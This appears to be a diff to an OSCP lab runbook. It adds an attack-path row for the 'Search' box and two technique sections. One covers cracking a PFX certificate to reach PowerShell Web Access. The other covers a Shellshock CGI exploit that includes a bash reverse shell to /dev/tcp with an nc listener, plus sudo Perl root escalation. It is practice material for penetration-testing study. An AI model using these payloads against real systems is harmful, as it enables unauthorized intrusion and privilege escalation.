@@ -22,6 +22,7 @@ Use variables from boxstart and boxset. Keep passwords, hashes, keys, cookies, a
 | [[OSCP/BOXES/WRITE UPS/AD/RockyColt\|RockyColt]] | [[#T01 - Recon and service triage\|T01]] -> [[#T02 - Anonymous SMB, LDAP, and RPC enumeration\|T02]] -> [[#T09 - Tomcat manager and WAR upload\|T09]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] -> [[#T36 - AD ACL, group membership, and ForceChangePassword\|T36]] -> [[#T38 - RBCD and delegated group abuse\|T38]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
 | [[OSCP/BOXES/WRITE UPS/AD/Sauna\|Sauna]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T34 - Kerberos AS-REP roasting and Kerberoasting\|T34]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] -> [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager\|T33]] -> [[#T39 - NTDS, VSS, Backup Operators, and DCSync\|T39]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
 | [[OSCP/BOXES/WRITE UPS/AD/Vintage\|Vintage]] | [[#T01 - Recon and service triage\|T01]] -> [[#T02 - Anonymous SMB, LDAP, and RPC enumeration\|T02]] -> [[#T34 - Kerberos AS-REP roasting and Kerberoasting\|T34]] -> [[#T37 - gMSA password read\|T37]] -> [[#T36 - AD ACL, group membership, and ForceChangePassword\|T36]] -> [[#T38 - RBCD and delegated group abuse\|T38]] -> [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager\|T33]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
+| [[OSCP/BOXES/WRITE UPS/AD/Search\|Search]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T34 - Kerberos AS-REP roasting and Kerberoasting\|T34]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T50 - Client certificate and PowerShell Web Access\|T50]] -> [[#T37 - gMSA password read\|T37]] -> [[#T36 - AD ACL, group membership, and ForceChangePassword\|T36]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
 | [[OSCP/BOXES/WRITE UPS/Linux/Bashed\|Bashed]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T20 - Interpreter, header backdoor, and exposed webshell\|T20]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] -> [[#T27 - Linux cron, systemd, and scheduled-file abuse\|T27]] -> [[#T26 - Linux SUID, capabilities, and privileged binary\|T26]] |
 | [[OSCP/BOXES/WRITE UPS/Linux/Blocky\|Blocky]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T08 - CMS, WordPress, Monstra, Magento, or plugin branch\|T08]] -> [[#T19 - JAR, PE, and custom binary analysis\|T19]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
 | [[OSCP/BOXES/WRITE UPS/Linux/Bratarina\|Bratarina]] | [[#T01 - Recon and service triage\|T01]] -> [[#T43 - SMTP, OpenSMTPD, and service-specific RCE\|T43]] -> [[#T21 - Buffer overflow and custom protocol exploit\|T21]] -> [[#T22 - Callback and shell stabilization\|T22]] |
@@ -1036,6 +1037,69 @@ python3 "$PickleProof" "$WebURL/$Path" | tee "$BoxDir/loot/deserialization-test.
 ### Open next
 
 Use [[OSCP/RUNBOOK V2/Linux - Python Pickle|Linux Python Pickle]] and return to [[#T22 - Callback and shell stabilization|T22]] after command execution is proven.
+
+## T50 - Client certificate and PowerShell Web Access
+
+### Run this
+
+~~~bash
+pfx2john "$BoxDir/loot/staff.pfx" > "$BoxDir/loot/staff.pfx.hash"
+john "$BoxDir/loot/staff.pfx.hash" --wordlist="$Wordlist"
+curl -skL "https://$Domain/staff" --cert-type P12 \
+  --cert "$BoxDir/loot/staff.pfx:$PfxPass" \
+  -c "$BoxDir/loot/cookies.txt" -b "$BoxDir/loot/cookies.txt" \
+  -o "$BoxDir/loot/staff-logon.html"
+firefox "https://$Domain/staff" &
+~~~
+
+### What did you get?
+
+- [ ] PFX cracks and identifies a domain user -> **Use the client certificate with the expected hostname and preserve the redirect chain.**
+- [ ] /staff reaches logon.aspx -> **Complete the stateful form in a browser, selecting computer-name and the target node.**
+- [ ] PowerShell opens -> **Run identity and group triage, then open [[#T37 - gMSA password read|T37]] or [[#T36 - AD ACL, group membership, and ForceChangePassword|T36]].**
+- [ ] Curl reports a PEM error or no useful status -> **Add --cert-type P12, use the domain name, and check local name resolution.**
+
+### Open next
+
+Use [[OSCP/RUNBOOK V2/AD - PowerShell Web Access|AD PowerShell Web Access]] and preserve the form, cookies, target node, and shell identity.
+
+## T51 - Apache CGI Shellshock and passwordless Perl
+
+### Run this
+
+~~~bash
+curl -si "http://$BoxIP:$WebPort/cgi-bin/"
+
+gobuster dir -u "http://$BoxIP:$WebPort/cgi-bin/" \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x sh,cgi,pl,py -o "$BoxDir/loot/gobuster-cgi.txt"
+
+curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
+  -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id'
+
+nc -lvnp "$Lport"
+
+curl --max-time 10 -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
+  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"
+
+sudo -n -l
+
+sudo /usr/bin/perl -e 'exec "/bin/bash";'
+
+id
+~~~
+
+### What did you get?
+
+- [ ] The direct CGI file returns a uid line -> **Save the harmless proof, then send the callback through the same header.**
+- [ ] The listener receives a shell -> **Run id, whoami, and hostname, stabilise the terminal, and open [[#T22 - Callback and shell stabilization|T22]].**
+- [ ] Sudo allows the exact Perl path without a password -> **Use Perl inline execution, prove UID 0, and open [[#T49 - Cleanup and closeout after a scenario branch|T49]].**
+- [ ] The HTTP request times out after callback delivery -> **Check the listener; the CGI process may be attached to the shell.**
+- [ ] The identity proof fails -> **Return to [[OSCP/RUNBOOK V2/Linux - Shellshock CGI|Linux Shellshock CGI]] and confirm the script, header, and interpreter.**
+
+### Open next
+
+Use [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]], [[OSCP/RUNBOOK V2/Linux - Shellshock CGI|Linux Shellshock CGI]], and [[#T49 - Cleanup and closeout after a scenario branch|T49]].
 
 ## T49 - Cleanup and closeout after a scenario branch
 
